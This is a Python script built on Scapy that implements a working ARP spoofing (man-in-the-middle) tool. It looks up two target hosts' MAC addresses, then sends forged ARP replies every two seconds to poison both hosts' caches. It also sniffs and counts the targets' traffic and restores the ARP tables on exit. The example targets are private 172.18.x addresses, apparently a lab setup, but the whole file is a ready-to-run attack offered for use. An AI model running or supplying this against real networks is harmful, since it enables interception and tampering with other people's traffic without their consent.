from scapy.all import Ether, ARP, srp, send, sniff, conf
import time
import sys
import threading
from collections import defaultdict

class ARPSpoofer:
    def __init__(self, target1_ip, target2_ip, interface="eth0"):
        self.target1_ip = target1_ip
        self.target2_ip = target2_ip
        self.interface = interface
        conf.iface = interface
        self.packet_counts = defaultdict(int)
        self.running = True
        self.target1_mac = None
        self.target2_mac = None

    def get_mac(self, ip):
        """
        Retrieves the MAC address of a given IP address using ARP.
        """
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None

    def restore_arp_tables(self):
        """
        Restores the ARP tables of the targets by sending correct ARP replies.
        """
        if self.target1_mac and self.target2_mac:
            print("[*] Restoring ARP tables...")
            send(ARP(op=2, pdst=self.target1_ip, psrc=self.target2_ip,
                    hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target2_mac), count=4, verbose=False)
            send(ARP(op=2, pdst=self.target2_ip, psrc=self.target1_ip,
                    hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target1_mac), count=4, verbose=False)
            print("[*] ARP tables restored.")
        else:
            print("[!] Could not restore ARP tables: MAC addresses not found.")

    def monitor_traffic(self):
        """
        Monitors captured traffic to verify spoofing success.
        """
        def packet_callback(pkt):
            if pkt.haslayer("IP"):
                if pkt["IP"].src == self.target1_ip or pkt["IP"].src == self.target2_ip:
                    self.packet_counts[pkt["IP"].src] += 1

        sniff(filter=f"host {self.target1_ip} or host {self.target2_ip}",
              prn=packet_callback, store=0)

    def print_status(self):
        """
        Prints periodic status updates.
        """
        while self.running:
            print("\nTraffic Statistics:")
            for ip, count in self.packet_counts.items():
                print(f"Packets from {ip}: {count}")
            time.sleep(5)

    def run(self):
        try:
            # Get MAC addresses of targets
            self.target1_mac = self.get_mac(self.target1_ip)
            self.target2_mac = self.get_mac(self.target2_ip)

            if not self.target1_mac or not self.target2_mac:
                print("[!] Failed to get MAC addresses of targets. Exiting.")
                sys.exit(1)

            print(f"[*] Target 1 MAC: {self.target1_mac}")
            print(f"[*] Target 2 MAC: {self.target2_mac}")

            # Start traffic monitoring
            monitor_thread = threading.Thread(target=self.monitor_traffic)
            monitor_thread.daemon = True
            monitor_thread.start()

            # Start status printing
            status_thread = threading.Thread(target=self.print_status)
            status_thread.daemon = True
            status_thread.start()

            print("[*] Starting ARP spoofing. Press CTRL+C to stop.")
            while self.running:
                # Send ARP poison packets
                send(ARP(op=2, pdst=self.target1_ip, psrc=self.target2_ip,
                        hwdst=self.target1_mac), verbose=False)
                send(ARP(op=2, pdst=self.target2_ip, psrc=self.target1_ip,
                        hwdst=self.target2_mac), verbose=False)
                
                time.sleep(2)

        except KeyboardInterrupt:
            self.running = False
            print("\n[*] Stopping ARP spoof attack. Restoring network...")
            self.restore_arp_tables()

if __name__ == "__main__":
    # Example usage
    spoofer = ARPSpoofer(
        target1_ip="172.18.0.11",  # Replace with your target IP
        target2_ip="172.18.0.9",   # Replace with your target IP
        interface="eth0"           # Replace with your interface
    )
    spoofer.run()